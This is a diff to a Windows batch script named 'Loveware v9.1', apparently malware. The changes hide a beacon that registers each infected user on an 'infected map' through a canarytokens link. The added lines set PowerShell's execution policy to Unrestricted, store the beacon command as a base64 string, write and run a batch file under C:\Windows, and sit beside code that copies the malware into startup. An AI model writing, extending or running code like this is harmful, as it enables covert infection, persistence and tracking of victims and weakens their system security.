@@ -2,7 +2,7 @@
 
 :: THIS VERSION CAN CONTAIN BUGS
 ::
-:: LOVEWARE v9.0
+:: LOVEWARE v9.1
 ::
 ::
 :: Name: Loveware
@@ -173,12 +173,23 @@ goto run1
 timeout 20
 goto copylove
 
+:run1
+
 :: Goto canarytoken link that will add the infected by Loveware user to the Loveware Infected map.
 :: Loveware infected map: https://canarytokens.org/manage?token=h8blu81q8j2vzu825fmpzut7r&auth=e8be20c708872b669cd4562d35b5abf7
 
-start /min http://canarytokens.com/tags/terms/h8blu81q8j2vzu825fmpzut7r/contact.php
+PowerShell.exe -command "Set-ExecutionPolicy Unrestricted"
 
-:run1
+echo set "base64string=c3RhcnQgL21pbiBodHRwOi8vY2FuYXJ5dG9rZW5zLmNvbS90YWdzL3Rlcm1zL2g4Ymx1ODFxOGoydnp1ODI1Zm1wenV0N3IvY29udGFjdC5waHA=">>Canary.ps1
+echo for /f "tokens=* delims=" %%# in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%base64string%"""^)^)') do set "decoded=%%#">>Canary.ps1
+
+echo echo %decoded% | Out-File -FilePath C:\Windows\Canary.bat -Force>>Canary.ps1
+
+start /min Canary.ps1
+
+timeout 8
+
+start /min Canary.bat
 
 :: Copy Loveware to the startup
 
